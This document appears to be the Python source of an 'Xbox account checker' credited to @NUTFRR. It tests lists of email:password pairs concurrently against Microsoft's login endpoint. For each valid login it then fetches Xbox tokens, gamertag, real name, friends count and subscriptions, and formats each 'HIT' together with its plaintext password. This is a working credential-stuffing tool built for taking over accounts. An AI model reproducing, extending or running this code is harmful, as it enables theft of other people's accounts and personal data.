"""
╔══════════════════════════════════════════════════════╗
║          XBOX ACCOUNT CHECKER — API ENGINE           ║
║               MADE BY - @NUTFRR                      ║
╚══════════════════════════════════════════════════════╝

Checks Xbox / Microsoft accounts via:
  1. Microsoft OAuth2 (live.com) — validates email:pass
  2. Xbox Live XSTS token exchange
  3. Xbox Profile API — gamertag, gamerscore, tier, subs

Returns a rich result dict per account.
"""

import re
import time
import asyncio
import aiohttp
import json
from typing import Optional
from dataclasses import dataclass, field, asdict


# ── Xbox API endpoints ─────────────────────────────────────────────────────────
MS_LOGIN_URL       = "https://login.live.com/oauth20_token.srf"
XBOX_AUTH_URL      = "https://user.auth.xboxlive.com/user/authenticate"
XSTS_URL           = "https://xsts.auth.xboxlive.com/xsts/authorize"
XBOX_PROFILE_URL   = "https://profile.xboxlive.com/users/me/settings"
XBOX_PRESENCE_URL  = "https://userpresence.xboxlive.com/users/me"
XBOX_SETTINGS_URL  = "https://profile.xboxlive.com/users/me/settings?settings=GameDisplayName,Gamerscore,AccountTier,XboxOneRep,PreferredColor,RealName,Bio,TenureLevel,Watermarks,IsQuarantined"
XBOX_SUBS_URL      = "https://subscription.mp.microsoft.com/v8.0/subscriptions/my"
XUID_PROFILE_URL   = "https://profile.xboxlive.com/users/xuid({xuid})/settings?settings=GameDisplayName,Gamerscore,AccountTier,TenureLevel"
FRIENDS_URL        = "https://social.xboxlive.com/users/me/summary"

# ── Status constants ───────────────────────────────────────────────────────────
STATUS_HIT         = "HIT"
STATUS_BAD         = "BAD"
STATUS_ERROR       = "ERROR"
STATUS_LOCKED      = "LOCKED"
STATUS_NO_XBOX     = "NO_XBOX"


@dataclass
class CheckResult:
    email: str
    password: str
    status: str = STATUS_ERROR
    gamertag: str = ""
    gamerscore: int = 0
    account_tier: str = ""
    tenure: str = ""
    rep: str = ""
    real_name: str = ""
    bio: str = ""
    xuid: str = ""
    subscriptions: list = field(default_factory=list)
    friends_count: int = 0
    game_pass: bool = False
    xbox_gold: bool = False
    error_msg: str = ""
    checked_at: float = field(default_factory=time.time)

    def to_dict(self) -> dict:
        return asdict(self)

    def hit_text(self) -> str:
        subs = ", ".join(self.subscriptions) if self.subscriptions else "None"
        gp = "✅ YES" if self.game_pass else "❌ No"
        gold = "✅ YES" if self.xbox_gold else "❌ No"
        return (
            f"✅ <b>HIT</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📧 <b>Email:</b> <code>{self.email}</code>\n"
            f"🔑 <b>Password:</b> <code>{self.password}</code>\n"
            f"🎮 <b>Gamertag:</b> <code>{self.gamertag}</code>\n"
            f"🏆 <b>Gamerscore:</b> <code>{self.gamerscore:,}</code>\n"
            f"⭐ <b>Tier:</b> <code>{self.account_tier}</code>\n"
            f"🎖️ <b>Tenure:</b> <code>{self.tenure}</code>\n"
            f"🤝 <b>Friends:</b> <code>{self.friends_count}</code>\n"
            f"🎮 <b>Game Pass:</b> {gp}\n"
            f"🥇 <b>Xbox Gold:</b> {gold}\n"
            f"📋 <b>Subs:</b> <code>{subs}</code>\n"
            f"🆔 <b>XUID:</b> <code>{self.xuid}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>MADE BY @NUTFRR</i>"
        )


async def _get_ms_token(session: aiohttp.ClientSession, email: str, password: str) -> Optional[str]:
    """
    Authenticate against Microsoft OAuth2.
    Returns access_token on success, None on failure.
    """
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    payload = {
        "grant_type": "password",
        "client_id": "000000004C12AE6F",
        "scope": "service::user.auth.xboxlive.com::MBI_SSL",
        "username": email,
        "password": password,
    }
    try:
        async with session.post(MS_LOGIN_URL, data=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=20)) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                return data.get("access_token")
            body = await resp.text()
            if "AADSTS50126" in body or "AADSTS50034" in body:
                return "BAD_CREDS"
            if "AADSTS50053" in body or "AADSTS50055" in body:
                return "LOCKED"
            return None
    except Exception:
        return None


async def _get_xbox_token(session: aiohttp.ClientSession, ms_token: str) -> Optional[tuple]:
    """
    Exchange MS token for Xbox Live token.
    Returns (xbox_token, uhs) or None.
    """
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    payload = {
        "Properties": {
            "AuthMethod": "RPS",
            "SiteName": "user.auth.xboxlive.com",
            "RpsTicket": ms_token,
        },
        "RelyingParty": "http://auth.xboxlive.com",
        "TokenType": "JWT",
    }
    try:
        async with session.post(XBOX_AUTH_URL, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=20)) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                token = data.get("Token")
                uhs = data["DisplayClaims"]["xui"][0]["uhs"]
                return token, uhs
    except Exception:
        pass
    return None


async def _get_xsts_token(session: aiohttp.ClientSession, xbox_token: str) -> Optional[tuple]:
    """
    Get XSTS token from Xbox token.
    Returns (xsts_token, uhs, xuid) or None.
    """
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    payload = {
        "Properties": {
            "SandboxId": "RETAIL",
            "UserTokens": [xbox_token],
        },
        "RelyingParty": "http://xboxlive.com",
        "TokenType": "JWT",
    }
    try:
        async with session.post(XSTS_URL, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=20)) as resp:
            data = await resp.json(content_type=None)
            if resp.status == 200:
                token = data.get("Token")
                xui = data["DisplayClaims"]["xui"][0]
                uhs = xui.get("uhs")
                xuid = xui.get("xid", "")
                return token, uhs, xuid
            # 2148916233 = no Xbox account
            if data.get("XErr") == 2148916233:
                return "NO_XBOX", None, None
    except Exception:
        pass
    return None, None, None


async def _get_profile(session: aiohttp.ClientSession, xsts_token: str, uhs: str, xuid: str) -> dict:
    """
    Fetch Xbox profile settings.
    """
    auth_header = f"XBL3.0 x={uhs};{xsts_token}"
    headers = {
        "Authorization": auth_header,
        "x-xbl-contract-version": "2",
        "Accept-Language": "en-US",
    }
    url = XUID_PROFILE_URL.format(xuid=xuid)
    result = {}
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                for s in data.get("profileUsers", [{}])[0].get("settings", []):
                    result[s["id"]] = s["value"]
    except Exception:
        pass
    return result


async def _get_friends(session: aiohttp.ClientSession, xsts_token: str, uhs: str) -> int:
    auth_header = f"XBL3.0 x={uhs};{xsts_token}"
    headers = {"Authorization": auth_header, "x-xbl-contract-version": "1"}
    try:
        async with session.get(FRIENDS_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                return data.get("friendsCount", 0)
    except Exception:
        pass
    return 0


async def _get_subscriptions(session: aiohttp.ClientSession, ms_token: str) -> list:
    """
    Fetch active Microsoft/Xbox subscriptions.
    Returns list of subscription names.
    """
    headers = {"Authorization": f"Bearer {ms_token}", "Accept": "application/json"}
    subs = []
    try:
        async with session.get(XBOX_SUBS_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                for item in data.get("items", []):
                    name = item.get("productName", "") or item.get("title", "")
                    if name:
                        subs.append(name)
    except Exception:
        pass
    return subs


async def check_account(email: str, password: str, proxy: Optional[str] = None) -> CheckResult:
    """
    Full account check pipeline.
    Returns CheckResult with all available data.
    """
    result = CheckResult(email=email.strip(), password=password.strip())
    connector = aiohttp.TCPConnector(ssl=False)
    proxy_url = proxy if proxy else None

    async with aiohttp.ClientSession(connector=connector) as session:
        # Step 1: MS auth
        ms_token = await _get_ms_token(session, email, password)
        if ms_token == "BAD_CREDS":
            result.status = STATUS_BAD
            result.error_msg = "Invalid credentials"
            return result
        if ms_token == "LOCKED":
            result.status = STATUS_LOCKED
            result.error_msg = "Account locked / requires verification"
            return result
        if not ms_token:
            result.status = STATUS_ERROR
            result.error_msg = "MS auth failed"
            return result

        # Step 2: Xbox token
        xbox_res = await _get_xbox_token(session, ms_token)
        if not xbox_res:
            result.status = STATUS_ERROR
            result.error_msg = "Xbox token exchange failed"
            return result
        xbox_token, uhs = xbox_res

        # Step 3: XSTS
        xsts_res = await _get_xsts_token(session, xbox_token)
        if xsts_res[0] == "NO_XBOX":
            result.status = STATUS_NO_XBOX
            result.error_msg = "Valid MS account but no Xbox profile"
            # Still a hit — valid creds
            result.gamertag = "No Xbox Account"
            return result
        xsts_token, xsts_uhs, xuid = xsts_res
        if not xsts_token:
            result.status = STATUS_ERROR
            result.error_msg = "XSTS failed"
            return result

        result.xuid = xuid or ""

        # Step 4: Profile
        profile = await _get_profile(session, xsts_token, xsts_uhs, xuid)
        result.gamertag = profile.get("GameDisplayName", "")
        result.account_tier = profile.get("AccountTier", "")
        result.tenure = profile.get("TenureLevel", "")
        result.rep = profile.get("XboxOneRep", "")
        result.real_name = profile.get("RealName", "")
        result.bio = profile.get("Bio", "")
        try:
            result.gamerscore = int(profile.get("Gamerscore", 0))
        except Exception:
            result.gamerscore = 0

        # Step 5: Friends count
        result.friends_count = await _get_friends(session, xsts_token, xsts_uhs)

        # Step 6: Subscriptions
        result.subscriptions = await _get_subscriptions(session, ms_token)
        for sub in result.subscriptions:
            sub_lower = sub.lower()
            if "game pass" in sub_lower or "gamepass" in sub_lower or "pc game" in sub_lower:
                result.game_pass = True
            if "gold" in sub_lower or "live gold" in sub_lower:
                result.xbox_gold = True

        result.status = STATUS_HIT
        return result


async def check_bulk(
    accounts: list,          # list of (email, password) tuples
    on_result=None,          # async callback(result, idx, total)
    max_concurrent: int = 5,
    proxy: Optional[str] = None,
    stop_event: asyncio.Event = None,
) -> list:
    """
    Check multiple accounts concurrently.
    Calls on_result(result, idx, total) after each check.
    Returns list of CheckResult.
    """
    results = []
    semaphore = asyncio.Semaphore(max_concurrent)
    total = len(accounts)

    async def _check_one(email, password, idx):
        if stop_event and stop_event.is_set():
            return
        async with semaphore:
            if stop_event and stop_event.is_set():
                return
            r = await check_account(email, password, proxy)
            results.append(r)
            if on_result:
                await on_result(r, idx, total)

    tasks = [_check_one(e, p, i) for i, (e, p) in enumerate(accounts, 1)]
    await asyncio.gather(*tasks, return_exceptions=True)
    return results
